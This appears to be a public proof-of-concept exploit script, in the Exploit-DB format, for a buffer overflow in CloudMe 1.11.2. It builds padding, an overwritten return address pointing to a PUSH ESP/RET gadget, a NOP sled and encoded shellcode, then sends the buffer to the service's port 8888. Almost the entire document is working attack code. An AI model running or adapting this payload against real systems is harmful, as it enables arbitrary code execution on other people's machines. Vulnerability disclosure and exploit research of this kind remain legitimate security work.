# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

payload =  b""
payload += b"\xb8\x99\x39\x9e\x2f\xda\xc9\xd9\x74\x24\xf4"
payload += b"\x5a\x31\xc9\xb1\x52\x83\xea\xfc\x31\x42\x0e"
payload += b"\x03\xdb\x37\x7c\xda\x27\xaf\x02\x25\xd7\x30"
payload += b"\x63\xaf\x32\x01\xa3\xcb\x37\x32\x13\x9f\x15"
payload += b"\xbf\xd8\xcd\x8d\x34\xac\xd9\xa2\xfd\x1b\x3c"
payload += b"\x8d\xfe\x30\x7c\x8c\x7c\x4b\x51\x6e\xbc\x84"
payload += b"\xa4\x6f\xf9\xf9\x45\x3d\x52\x75\xfb\xd1\xd7"
payload += b"\xc3\xc0\x5a\xab\xc2\x40\xbf\x7c\xe4\x61\x6e"
payload += b"\xf6\xbf\xa1\x91\xdb\xcb\xeb\x89\x38\xf1\xa2"
payload += b"\x22\x8a\x8d\x34\xe2\xc2\x6e\x9a\xcb\xea\x9c"
payload += b"\xe2\x0c\xcc\x7e\x91\x64\x2e\x02\xa2\xb3\x4c"
payload += b"\xd8\x27\x27\xf6\xab\x90\x83\x06\x7f\x46\x40"
payload += b"\x04\x34\x0c\x0e\x09\xcb\xc1\x25\x35\x40\xe4"
payload += b"\xe9\xbf\x12\xc3\x2d\x9b\xc1\x6a\x74\x41\xa7"
payload += b"\x93\x66\x2a\x18\x36\xed\xc7\x4d\x4b\xac\x8f"
payload += b"\xa2\x66\x4e\x50\xad\xf1\x3d\x62\x72\xaa\xa9"
payload += b"\xce\xfb\x74\x2e\x30\xd6\xc1\xa0\xcf\xd9\x31"
payload += b"\xe9\x0b\x8d\x61\x81\xba\xae\xe9\x51\x42\x7b"
payload += b"\xbd\x01\xec\xd4\x7e\xf1\x4c\x85\x16\x1b\x43"
payload += b"\xfa\x07\x24\x89\x93\xa2\xdf\x5a\x96\x38\xd1"
payload += b"\x06\xce\x3e\xed\x28\x6e\xb6\x0b\x3e\x60\x9e"
payload += b"\x84\xd7\x19\xbb\x5e\x49\xe5\x11\x1b\x49\x6d"
payload += b"\x96\xdc\x04\x86\xd3\xce\xf1\x66\xae\xac\x54"
payload += b"\x78\x04\xd8\x3b\xeb\xc3\x18\x35\x10\x5c\x4f"
payload += b"\x12\xe6\x95\x05\x8e\x51\x0c\x3b\x53\x07\x77"
payload += b"\xff\x88\xf4\x76\xfe\x5d\x40\x5d\x10\x98\x49"
payload += b"\xd9\x44\x74\x1c\xb7\x32\x32\xf6\x79\xec\xec"
payload += b"\xa5\xd3\x78\x68\x86\xe3\xfe\x75\xc3\x95\x1e"
payload += b"\xc7\xba\xe3\x21\xe8\x2a\xe4\x5a\x14\xcb\x0b"
payload += b"\xb1\x9c\xfb\x41\x9b\xb5\x93\x0f\x4e\x84\xf9"
payload += b"\xaf\xa5\xcb\x07\x2c\x4f\xb4\xf3\x2c\x3a\xb1"
payload += b"\xb8\xea\xd7\xcb\xd1\x9e\xd7\x78\xd1\x8a"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 
print(len(payload))
try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
